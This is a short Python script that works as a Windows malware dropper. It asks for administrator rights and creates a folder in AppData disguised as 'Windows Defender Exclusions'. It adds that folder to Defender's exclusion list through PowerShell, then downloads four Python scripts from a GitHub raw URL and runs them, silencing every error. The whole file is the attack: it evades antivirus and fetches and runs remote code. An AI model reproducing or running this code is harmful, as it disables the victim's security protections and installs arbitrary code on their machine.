import os
import ctypes
import subprocess
import sys
import requests
import random
import string

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_bullet_folder():
    
    appdata_path = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    folder_path = os.path.join(appdata_path, "Windows Defender Exclusions")
  
    os.makedirs(folder_path, exist_ok=True)

    return folder_path

def add_to_defender_exclusions(folder_path):
    try:
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{folder_path}\'"'
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        pass

def download_scripts(folder_path):
    script_urls = [
        "https://raw.githubusercontent.com/skibiditoiletfan1123/someting23/refs/heads/main/fish.py",
        "https://raw.githubusercontent.com/skibiditoiletfan1123/someting23/refs/heads/main/fishcatch.py",
        "https://raw.githubusercontent.com/skibiditoiletfan1123/someting23/refs/heads/main/fishtank.py",
        "https://raw.githubusercontent.com/skibiditoiletfan1123/someting23/refs/heads/main/pufferfish.py",
    ]
    
    script_paths = []
    
    for url in script_urls:
        try:
            response = requests.get(url)
            response.raise_for_status()
            script_name = os.path.basename(url)
            script_path = os.path.join(folder_path, script_name)
            with open(script_path, "wb") as file:
                file.write(response.content)
            script_paths.append(script_path)
        except requests.RequestException:
            pass
    
    return script_paths

def run_scripts(script_paths):
    processes = []
    for script in script_paths:
        try:
            process = subprocess.Popen(['python', script])
            processes.append(process)
        except Exception:
            pass
    for process in processes:
        process.wait()

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        folder_path = create_bullet_folder()  
        add_to_defender_exclusions(folder_path)  
        script_paths = download_scripts(folder_path) 
        run_scripts(script_paths)  
